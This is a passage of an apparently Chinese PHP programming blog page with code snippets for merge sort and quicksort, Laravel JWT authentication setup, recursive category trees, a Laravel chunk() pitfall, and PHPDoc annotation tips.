class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 归并排序</span></span><br><span class="line"><span class="comment"> * @param $arr</span></span><br><span class="line"><span class="comment"> * @return array</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mergeSort</span>(<span class="params">$arr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $arrCount = count($arr);</span><br><span class="line">    <span class="keyword">if</span> ($arrCount &lt; <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> $arr;</span><br><span class="line">    &#125;</span><br><span class="line">    $mid = ceil($arrCount / <span class="number">2</span>); <span class="comment">// 向上取整一下</span></span><br><span class="line">    $leftArr = array_slice($arr, <span class="number">0</span>, $mid);</span><br><span class="line">    $rightArr = array_slice($arr, $mid, $arrCount - $mid);</span><br><span class="line">    <span class="keyword">return</span> mergeArr(mergeSort($leftArr), mergeSort($rightArr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 最终合并数组的方法</span></span><br><span class="line"><span class="comment"> * @param $leftArr</span></span><br><span class="line"><span class="comment"> * @param $rightArr</span></span><br><span class="line"><span class="comment"> * @return array</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mergeArr</span>(<span class="params">$leftArr, $rightArr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $i = <span class="number">0</span>;</span><br><span class="line">    $j = <span class="number">0</span>;</span><br><span class="line">    $returnArr = [];</span><br><span class="line">    <span class="keyword">while</span> ($i &lt; count($leftArr) &amp;&amp; $j &lt; count($rightArr)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($leftArr[$i] &lt; $rightArr[$j]) &#123;</span><br><span class="line">            $returnArr[] = $leftArr[$i];</span><br><span class="line">            $i++;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> ($leftArr[$i] &gt; $rightArr[$j]) &#123;</span><br><span class="line">            $returnArr[] = $rightArr[$j];</span><br><span class="line">            $j++;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $returnArr[] = $leftArr[$i];</span><br><span class="line">            $returnArr[] = $rightArr[$j];</span><br><span class="line">            $i++;</span><br><span class="line">            $j++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ($temp = $i; $temp &lt; count($leftArr); $temp++) &#123;</span><br><span class="line">        $returnArr[] = $leftArr[$temp];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ($temp = $j; $temp &lt; count($rightArr); $temp++) &#123;</span><br><span class="line">        $returnArr[] = $rightArr[$temp];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $returnArr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 快速排序https://www.h57.pw/2017/04/10/thinking-about-divide-and-conquer-by-sorting-fast-merging/</span></span><br><span class="line"><span class="comment"> * @param $arr</span></span><br><span class="line"><span class="comment"> * @return array</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">quickSort</span>(<span class="params">$arr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (count($arr) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> $arr;</span><br><span class="line">    &#125;</span><br><span class="line">    $flag = $arr[<span class="number">0</span>];</span><br><span class="line">    $lessArr = [];</span><br><span class="line">    $largeArr = [];</span><br><span class="line">    $flagArr = [];</span><br><span class="line">    $flagArr[] = $flag;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">1</span>; $i &lt; count($arr); $i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($arr[$i] &lt; $flag) &#123;</span><br><span class="line">            $lessArr[] = $arr[$i];</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> ($arr[$i] &gt; $flag) &#123;</span><br><span class="line">            $largeArr[] = $arr[$i];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $flagArr[] = $arr[$i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> array_merge(quickSort($lessArr), $flagArr, quickSort($largeArr));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Jwt前后端分离"><a href="#Jwt前后端分离" class="headerlink" title="Jwt前后端分离"></a>Jwt前后端分离</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">vi composer.json </span><br><span class="line"><span class="string">"require"</span>: &#123;</span><br><span class="line">        <span class="string">"tymon/jwt-auth"</span>: <span class="string">"1.0.*"</span></span><br><span class="line">    &#125;,</span><br><span class="line"> php artisan jwt:secret</span><br><span class="line"> https:<span class="comment">//www.njphper.com/posts/cd8c881c.html</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">extends</span> <span class="title">Model</span> <span class="title">implements</span> <span class="title">AuthenticatableContract</span>, <span class="title">AuthorizableContract</span>, <span class="title">JWTSubject</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line">     use Authenticatable, Authorizable;</span><br><span class="line"> </span><br><span class="line">     <span class="comment">/**</span></span><br><span class="line"><span class="comment">      * The attributes that are mass assignable.</span></span><br><span class="line"><span class="comment">      *</span></span><br><span class="line"><span class="comment">      * @var array</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">     protected $fillable = [</span><br><span class="line">         <span class="string">'name'</span>, <span class="string">'email'</span>,</span><br><span class="line">     ];</span><br><span class="line"> </span><br><span class="line">     <span class="comment">/**</span></span><br><span class="line"><span class="comment">      * The attributes excluded from the model's JSON form.</span></span><br><span class="line"><span class="comment">      *</span></span><br><span class="line"><span class="comment">      * @var array</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">     protected $hidden = [</span><br><span class="line">         <span class="string">'password'</span>,</span><br><span class="line">     ];</span><br><span class="line"> </span><br><span class="line"> 	<span class="comment">/**</span></span><br><span class="line"><span class="comment"> 	 * Get the identifier that will be stored in the subject claim of the JWT.</span></span><br><span class="line"><span class="comment"> 	 *</span></span><br><span class="line"><span class="comment"> 	 * @return mixed</span></span><br><span class="line"><span class="comment"> 	 */</span></span><br><span class="line"> 	public <span class="function"><span class="keyword">function</span> <span class="title">getJWTIdentifier</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"> 	</span>&#123;</span><br><span class="line"> 		<span class="keyword">return</span> $<span class="keyword">this</span>-&gt;getKey();</span><br><span class="line"> 	&#125;</span><br><span class="line"> </span><br><span class="line"> 	<span class="comment">/**</span></span><br><span class="line"><span class="comment"> 	 * Return a key value array, containing any custom claims to be added to the JWT.</span></span><br><span class="line"><span class="comment"> 	 *</span></span><br><span class="line"><span class="comment"> 	 * @return array</span></span><br><span class="line"><span class="comment"> 	 */</span></span><br><span class="line"> 	public <span class="function"><span class="keyword">function</span> <span class="title">getJWTCustomClaims</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"> 	</span>&#123;</span><br><span class="line"> 		<span class="keyword">return</span> [];</span><br><span class="line"> 	&#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<h3 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line">&amp; 引用赋值</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doloop1</span>(<span class="params">&amp;$i = <span class="number">1</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    print_r($i);</span><br><span class="line">    $i++;</span><br><span class="line">    <span class="keyword">if</span> ($i &lt;= <span class="number">10</span>) &#123;</span><br><span class="line">        doloop1($i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">doloop1();</span><br><span class="line"><span class="keyword">static</span> 静态变量https:<span class="comment">//learnku.com/articles/28252#topnav</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doloop2</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> $i = <span class="number">1</span>;</span><br><span class="line">    print_r($i);</span><br><span class="line">    $i++;</span><br><span class="line">    <span class="keyword">if</span> ($i &lt;= <span class="number">10</span>) &#123;</span><br><span class="line">        doloop2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">doloop2();</span><br><span class="line">global 全局变量</span><br><span class="line">$i = <span class="number">1</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doloop3</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    global $i;</span><br><span class="line">    echo $i;</span><br><span class="line">    $i++;</span><br><span class="line">    <span class="keyword">if</span> ($i &lt;= <span class="number">10</span>) &#123;</span><br><span class="line">        doloop3();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">doloop3();</span><br><span class="line">$data = [</span><br><span class="line">            [<span class="string">'id'</span> =&gt; <span class="number">1</span>, <span class="string">'title'</span> =&gt; <span class="string">'Electronics'</span>, <span class="string">'parent_id'</span> =&gt; <span class="number">0</span>],</span><br><span class="line">            [<span class="string">'id'</span> =&gt; <span class="number">2</span>, <span class="string">'title'</span> =&gt; <span class="string">'Laptops &amp; PC'</span>, <span class="string">'parent_id'</span> =&gt; <span class="number">1</span>],</span><br><span class="line">            [<span class="string">'id'</span> =&gt; <span class="number">3</span>, <span class="string">'title'</span> =&gt; <span class="string">'Laptops'</span>, <span class="string">'parent_id'</span> =&gt; <span class="number">2</span>],</span><br><span class="line">            [<span class="string">'id'</span> =&gt; <span class="number">4</span>, <span class="string">'title'</span> =&gt; <span class="string">'PC'</span>, <span class="string">'parent_id'</span> =&gt; <span class="number">2</span>],</span><br><span class="line">            [<span class="string">'id'</span> =&gt; <span class="number">5</span>, <span class="string">'title'</span> =&gt; <span class="string">'Cameras &amp; photo'</span>, <span class="string">'parent_id'</span> =&gt; <span class="number">1</span>],</span><br><span class="line">            [<span class="string">'id'</span> =&gt; <span class="number">6</span>, <span class="string">'title'</span> =&gt; <span class="string">'Camera'</span>, <span class="string">'parent_id'</span> =&gt; <span class="number">5</span>],</span><br><span class="line">            [<span class="string">'id'</span> =&gt; <span class="number">7</span>, <span class="string">'title'</span> =&gt; <span class="string">'Phones &amp; Accessories'</span>, <span class="string">'parent_id'</span> =&gt; <span class="number">1</span>],</span><br><span class="line">            [<span class="string">'id'</span> =&gt; <span class="number">8</span>, <span class="string">'title'</span> =&gt; <span class="string">'Smartphones'</span>, <span class="string">'parent_id'</span> =&gt; <span class="number">7</span>],</span><br><span class="line">            [<span class="string">'id'</span> =&gt; <span class="number">9</span>, <span class="string">'title'</span> =&gt; <span class="string">'Android'</span>, <span class="string">'parent_id'</span> =&gt; <span class="number">8</span>],</span><br><span class="line">            [<span class="string">'id'</span> =&gt; <span class="number">10</span>, <span class="string">'title'</span> =&gt; <span class="string">'iOS'</span>, <span class="string">'parent_id'</span> =&gt; <span class="number">8</span>],</span><br><span class="line">            [<span class="string">'id'</span> =&gt; <span class="number">11</span>, <span class="string">'title'</span> =&gt; <span class="string">'Other Smartphones'</span>, <span class="string">'parent_id'</span> =&gt; <span class="number">8</span>],</span><br><span class="line">            [<span class="string">'id'</span> =&gt; <span class="number">12</span>, <span class="string">'title'</span> =&gt; <span class="string">'Batteries'</span>, <span class="string">'parent_id'</span> =&gt; <span class="number">7</span>],</span><br><span class="line">            [<span class="string">'id'</span> =&gt; <span class="number">13</span>, <span class="string">'title'</span> =&gt; <span class="string">'Headsets'</span>, <span class="string">'parent_id'</span> =&gt; <span class="number">7</span>],</span><br><span class="line">            [<span class="string">'id'</span> =&gt; <span class="number">14</span>, <span class="string">'title'</span> =&gt; <span class="string">'Screen Protectors'</span>, <span class="string">'parent_id'</span> =&gt; <span class="number">7</span>],</span><br><span class="line">        ];</span><br><span class="line">获取无限极分类</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 值引用获取无限极分类树</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param array $data</span></span><br><span class="line"><span class="comment"> * [[[@return](https://learnku.com/users/31554)](https://learnku.com/users/31554)](https://learnku.com/users/31554) array</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">make_tree</span>(<span class="params">$data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    $refer = array();  </span><br><span class="line">    $tree = array();  </span><br><span class="line">    foreach($data <span class="keyword">as</span> $k =&gt; $v)&#123;  </span><br><span class="line">        $refer[$v[<span class="string">'id'</span>]] = &amp; $data[$k];  <span class="comment">//创建主键的数组引用  </span></span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">    foreach($data <span class="keyword">as</span> $k =&gt; $v)&#123;  </span><br><span class="line">        $parent_id = $v[<span class="string">'parent_id'</span>];   <span class="comment">//获取当前分类的父级id  </span></span><br><span class="line">        <span class="keyword">if</span>($parent_id == <span class="number">0</span>)&#123;  </span><br><span class="line">            $tree[] = &amp; $data[$k];   <span class="comment">//顶级栏目</span></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">            <span class="keyword">if</span>(isset($refer[$parent_id]))&#123;  </span><br><span class="line">                $refer[$parent_id][<span class="string">'children'</span>][] = &amp; $data[$k];  <span class="comment">//如果存在父级栏目，则添加进父级栏目的子栏目数组中  </span></span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $tree;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 递归获取无限极分类树</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param array $data</span></span><br><span class="line"><span class="comment"> * @param int $parent_id</span></span><br><span class="line"><span class="comment"> * @param int $level</span></span><br><span class="line"><span class="comment"> * [[[@return](https://learnku.com/users/31554)](https://learnku.com/users/31554)](https://learnku.com/users/31554) array</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">make_tree2</span>(<span class="params">$data = [], $parent_id = <span class="number">0</span>, $level = <span class="number">0</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $tree = [];</span><br><span class="line">    <span class="keyword">if</span> ($data &amp;&amp; is_array($data)) &#123;</span><br><span class="line">        foreach ($data <span class="keyword">as</span> $v) &#123;</span><br><span class="line">            <span class="keyword">if</span> ($v[<span class="string">'parent_id'</span>] == $parent_id) &#123;</span><br><span class="line">                $tree[] = [</span><br><span class="line">                    <span class="string">'id'</span> =&gt; $v[<span class="string">'id'</span>],</span><br><span class="line">                    <span class="string">'level'</span> =&gt; $level,</span><br><span class="line">                    <span class="string">'title'</span> =&gt; $v[<span class="string">'title'</span>],</span><br><span class="line">                    <span class="string">'parent_id'</span> =&gt; $v[<span class="string">'parent_id'</span>],</span><br><span class="line">                    <span class="string">'children'</span> =&gt; make_tree2($data, $v[<span class="string">'id'</span>], $level + <span class="number">1</span>),</span><br><span class="line">                ];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $tree;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Laravel中chunk方法分块处理数据的坑"><a href="#Laravel中chunk方法分块处理数据的坑" class="headerlink" title="Laravel中chunk方法分块处理数据的坑"></a>Laravel中chunk方法分块处理数据的坑</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">chunk</span>(<span class="params">$count, callable $callback</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 我理解的是类似于limit,offset 实现数据分页查询  </span></span><br><span class="line">    $results = $<span class="keyword">this</span>-&gt;forPage($page = <span class="number">1</span>, $count)-&gt;get();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (count($results) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// On each chunk result set, we will pass them to the callback and then let the</span></span><br><span class="line">        <span class="comment">// developer take care of everything within the callback, which allows us to</span></span><br><span class="line">        <span class="comment">// keep the memory low for spinning through large result sets for working.</span></span><br><span class="line">        <span class="comment">// 如果用户回调中，更新的字段与查询的字段是一个条件，就会出现这样的问题             </span></span><br><span class="line">        <span class="keyword">if</span> (call_user_func($callback, $results) === <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $page++;</span><br><span class="line"></span><br><span class="line">        $results = $<span class="keyword">this</span>-&gt;forPage($page, $count)-&gt;get();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 1.先去查询需要更新的数据量 </span></span><br><span class="line">    $count = DB::table(<span class="string">'table'</span>)</span><br><span class="line">               -&gt;where(<span class="string">'status'</span>, <span class="string">'='</span>, <span class="number">0</span>)</span><br><span class="line">               -&gt;count();</span><br><span class="line">    echo <span class="string">"需要推送的数量:$count\r\n"</span>;</span><br><span class="line">    <span class="keyword">while</span> ($count) &#123;</span><br><span class="line">        <span class="comment">// 2.然后limit去查数据 </span></span><br><span class="line">        $data= DB::table(self::OPEN_API_WUBA_TEST_CLUE)</span><br><span class="line">                 -&gt;where(<span class="string">'is_push'</span>, <span class="string">'='</span>, <span class="attr">self</span>::IS_PUSH_FAILED)</span><br><span class="line">                 -&gt;limit(<span class="number">100</span>)</span><br><span class="line">                 -&gt;get();</span><br><span class="line">        ! empty($data) &amp;&amp; $<span class="keyword">this</span>-&gt;processData($data);</span><br><span class="line">        <span class="comment">// 3.批次处理完数据，再去查询下 需要更新的数据，直到更新完毕退出循环  </span></span><br><span class="line">        $count = DB::table(<span class="string">'table'</span>)</span><br><span class="line">                   -&gt;where(<span class="string">'status'</span>, <span class="string">'='</span>, <span class="number">0</span>)</span><br><span class="line">                   -&gt;count();</span><br><span class="line">        echo <span class="string">"剩余推送的记录数:$count\r\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    exit(<span class="string">"数据全部推送完毕.\r\n"</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private <span class="function"><span class="keyword">function</span> <span class="title">processData</span>(<span class="params">$data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// TODO(xiaoyi):处理数据业务逻辑https://segmentfault.com/a/1190000015284897</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="代码细节"><a href="#代码细节" class="headerlink" title="代码细节"></a>代码细节</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">一个数组对象成员，你知道怎么写吗？</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @var Ads[]</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">public $adsList = [];</span><br><span class="line">类的魔术方法调用的注释，你知道怎么写吗？https:<span class="comment">//yq.aliyun.com/articles/691719?spm=a2c4e.11153959.0.0.1a265ee3ENEDVQ</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @link http://manual.phpdoc.org/HTMLframesConverter/default/</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @method static int search(string $query, $limit = 10, $offset = 0)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SearchServiceProxy</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">__callStatic</span>(<span class="params">$method, $arguments</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!method_exists(<span class="string">"SearchService"</span>, $method)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> \LogicException(__CLASS__ . <span class="string">"::"</span> . $method . <span class="string">" not found"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            $data = call_user_func_array([<span class="string">"SearchService"</span>, $method], $<span class="built_in">arguments</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (\Exception $e) &#123;</span><br><span class="line">            error_log($e-&gt;getMessage());</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $data;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SearchService</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @param string $query</span></span><br><span class="line"><span class="comment">     * @param int    $limit</span></span><br><span class="line"><span class="comment">     * @param int    $offset</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @return array</span></span><br><span class="line"><span class="comment">     * @deprecated 方法废弃</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">search</span>(<span class="params">string $query, $limit = <span class="number">10</span>, $offset = <span class="number">0</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> [</span><br><span class="line">            [<span class="string">"id"</span> =&gt; <span class="number">1</span>, <span class="string">"aaa"</span>],</span><br><span class="line">            [<span class="string">"id"</span> =&gt; <span class="number">2</span>, <span class="string">"bbb"</span>],</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
